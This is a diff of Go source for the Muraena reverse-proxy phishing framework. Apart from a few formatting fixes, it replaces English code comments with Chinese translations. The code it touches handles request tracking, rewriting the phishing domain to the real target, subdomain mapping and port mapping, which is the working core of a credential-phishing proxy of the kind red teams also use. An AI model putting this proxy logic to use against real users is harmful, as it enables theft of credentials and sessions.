@@ -120,14 +120,13 @@ func (muraena *MuraenaProxy) RequestProcessor(request *http.Request) (err error)
 		sess.Config.Transform.Base64.Padding,
 	}
 
-	// Replacer object
+	// Replacer 对象
 	replacer := muraena.Replacer
 
-	//
-	// TRACKING
+	// 跟踪请求
 	track := muraena.Tracker.TrackRequest(request)
 
-	// DROP
+	// 删除此 Request，如果 drop.Path == request.URL.Path
 	dropRequest := false
 	for _, drop := range sess.Config.Drop {
 		if request.URL.Path == drop.Path {
@@ -146,10 +145,7 @@ func (muraena *MuraenaProxy) RequestProcessor(request *http.Request) (err error)
 	//
 	// no garbage to remove in requests, for now ..
 
-	//
-	// HEADERS
-	//
-	// Transform query string using internal core.url instead of net.url
+	// 使用 core.url 转换 query（key:value 的形式）
 	query, err := core.ParseQuery(request.URL.RawQuery)
 	if err != nil {
 		log.Error("URL: %s \n %s", request.URL, err.Error())
@@ -352,7 +348,6 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 			}
 		}
 
-
 	} else {
 		if len(response.Cookies()) > 0 {
 			log.Debug("[TODO] Missing cookies to track: \n%s\n%+v", response.Request.URL, response.Cookies())
@@ -425,14 +420,14 @@ func (init *MuraenaProxyInit) Spawn() *MuraenaProxy {
 	if err != nil {
 		log.Error("%s", err)
 	}
-
+	// 将 tracker 加入到 muraena
 	tracker, ok := m.(*tracking.Tracker)
 	if ok {
 		muraena.Tracker = tracker
 	}
 
 	proxy := muraena.ReverseProxy
-
+	// director 为路径生成函数
 	director := proxy.Director
 	proxy.Director = func(r *http.Request) {
 		if err = muraena.RequestProcessor(r); err != nil {
@@ -463,25 +458,26 @@ func (st *SessionType) HandleFood(response http.ResponseWriter, request *http.Re
 	var destination string
 	sess := st.Session
 	replacer := st.Replacer
-
+	// 如果支持静态服务器
 	if sess.Config.StaticServer.Enabled {
+		// 找到 static.http 模块
 		m, err := sess.Module("static.http")
 		if err != nil {
 			log.Error("%s", err)
 		}
-
+		// 将 module 类型转为 statichttp.StaticHTTP 类型
 		ss, ok := m.(*statichttp.StaticHTTP)
 		if ok {
+			// destination = 经处理的 request.URL
 			destination = ss.MakeDestinationURL(request.URL)
 		}
 	}
 
 	if destination == "" {
-		if strings.HasPrefix(request.Host, replacer.ExternalOriginPrefix) { //external domain mapping
+		if strings.HasPrefix(request.Host, replacer.ExternalOriginPrefix) { // 外部域映射
 			for domain, subMapping := range replacer.OriginsMapping {
-
-				// even if the resource is aa.bb.cc.dom.tld, the mapping is always one level as in www--2.phishing.tld.
-				// This is specifically important since wildcard SSL certs do not handle N levels of nesting
+				// 即使资源是 aa.bb.cc.dom.tld，映射也始终是一级，如 www--2.phishing.tld 中那样
+				// 这一点特别重要，因为通配符 SSL 证书不处理 N 层嵌套
 				if subMapping == strings.Split(request.Host, ".")[0] {
 					destination = fmt.Sprintf("%s%s", sess.Config.Protocol,
 						strings.Replace(request.Host,
@@ -491,12 +487,11 @@ func (st *SessionType) HandleFood(response http.ResponseWriter, request *http.Re
 				}
 			}
 		} else {
-			destination = fmt.Sprintf("%s%s", sess.Config.Protocol,
-				strings.Replace(request.Host, replacer.Phishing, replacer.Target, -1))
+			destination = fmt.Sprintf("%s%s", sess.Config.Protocol, strings.Replace(request.Host, replacer.Phishing, replacer.Target, -1))
 		}
 	}
 
-	// PortMapping
+	// 端口映射
 	if sess.Config.Proxy.PortMap != "" {
 
 		destURL, err := url.Parse(destination)
@@ -512,7 +507,7 @@ func (st *SessionType) HandleFood(response http.ResponseWriter, request *http.Re
 				port = "80"
 				destination = fmt.Sprintf("%s:%s", destination, port)
 			}
-
+			// 映射到 sess.Config.Proxy.PortMap 定义的新端口
 			if strings.HasPrefix(sess.Config.Proxy.PortMap, fmt.Sprintf("%s:", port)) {
 				newport := strings.Split(sess.Config.Proxy.PortMap, ":")[1]
 				destination = strings.Replace(destination, fmt.Sprintf(":%s", port), fmt.Sprintf(":%s", newport), 1)
@@ -526,7 +521,9 @@ func (st *SessionType) HandleFood(response http.ResponseWriter, request *http.Re
 	}
 
 	muraena := &MuraenaProxyInit{
-		Origin:   request.Host,
+		// 源头
+		Origin: request.Host,
+		// 目标
 		Target:   destination,
 		Session:  sess,
 		Replacer: replacer,
